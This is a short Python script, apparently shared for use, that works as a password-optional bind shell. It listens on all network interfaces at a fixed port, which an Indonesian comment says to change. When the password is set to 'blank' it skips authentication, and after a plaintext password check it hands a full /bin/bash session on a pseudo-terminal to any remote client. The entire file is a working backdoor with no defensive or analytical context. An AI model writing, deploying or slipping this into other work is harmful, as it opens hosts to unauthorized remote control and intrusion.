import hashlib
import pty
import select
import socket
import subprocess
import os
import sys
HOST = '0.0.0.0'
PORT = 6081  #Lu ganti jadi angka random, maksimal 5 angka

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)
set_password = sys.argv[1]
while True:
    conn, addr = s.accept()
    print('Connected by', addr)
    if set_password == "blank":
       password = "blank"
    else:
       conn.send(b'Enter password: ')
       password = conn.recv(1024).strip().decode()
    if password == set_password:
        master, slave = pty.openpty()
        p = subprocess.Popen(["/bin/bash"], stdin=slave, stdout=slave, stderr=slave)
        while True:
            r, w, e = select.select([conn, master], [], [])
            if conn in r:
                data = conn.recv(1024)
                if not data:
                    break
                os.write(master, data)
            if master in r:
                data = os.read(master, 1024)
                if not data:
                    break
                conn.send(data)
    else:
        conn.send(b'Incorrect password\n')
    conn.close()